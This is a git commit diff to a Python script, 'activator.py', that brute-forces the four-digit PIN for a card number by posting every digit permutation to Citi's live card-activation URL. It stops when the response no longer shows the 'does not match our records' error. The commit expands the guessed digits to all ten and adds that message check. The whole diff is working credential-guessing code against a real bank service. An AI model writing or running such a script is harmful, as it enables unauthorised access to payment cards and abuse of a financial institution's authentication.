3b9599ab5e5821741e312e2853163b24f72bc96b
Christopher Dellomes <cjdellomes@gmail.com>
2020-08-29 00:14:54 -0700

    Adjusted possible pin digits and response check.

--- activator.py
+++ activator.py
@@ -3,7 +3,7 @@ import config
 from permute import permute
 
 CONTINUE_URL = 'https://www.cardactivation.citi.com/Home/Continue1'
-POSSIBLE_PIN_DIGITS = [1, 3, 4, 5, 9]
+POSSIBLE_PIN_DIGITS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
 PIN_DIGIT_COUNT = 4
 
 card_number = config.card_number
@@ -21,7 +21,9 @@ for pin in possible_pins:
     continue_response = requests.post(CONTINUE_URL, json=request_payload)
     continue_response_payload = continue_response.json()
     status_code = continue_response_payload['Status']
+    msg = continue_response_payload['Msg']
 
-    if status_code != '999':
+    if status_code != '999' or msg != 'The information you entered does not match our records. Please try again or contact Citi Customer Service at the number on the activation sticker or on the back of your card.':
+        print(continue_response_payload)
         print(pin)
         break
